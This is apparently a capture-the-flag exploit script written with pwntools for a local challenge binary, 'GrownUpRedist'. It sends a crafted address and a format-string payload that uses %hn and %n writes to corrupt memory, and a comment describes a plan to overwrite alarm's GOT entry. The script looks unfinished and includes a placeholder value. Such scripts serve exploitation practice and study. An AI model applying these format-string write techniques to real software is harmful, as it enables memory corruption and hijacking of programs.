#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './GrownUpRedist'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

io.recvuntil("]: ")
addr = 0x601058
io.send('y\0\0\0\0\0\0\0' + p64(addr))

gdb.attach(io, 'b *0x40094e')
# null byte off by one -> format string bug
offset = 0xdc58
offset2 = 0xdead
pay = 'a' * 0x20
pay += '%c' * 13
pay += '%' + str(offset - 13) + 'd%hn'
pay += '%c' * 23 # 41 - 3 - 13 - 2
pay += '%' + str(offset2 - offset - 38) + 'd'
pay += '%*30$d%n' # "*d" can use the address on the stack
pay = pay.ljust(0x80 , 'a')
io.recvuntil("Name: ")
io.send(pay)

# we can overwrite the alarm.got and printf a bigger string to trigger the alarm


io.interactive()
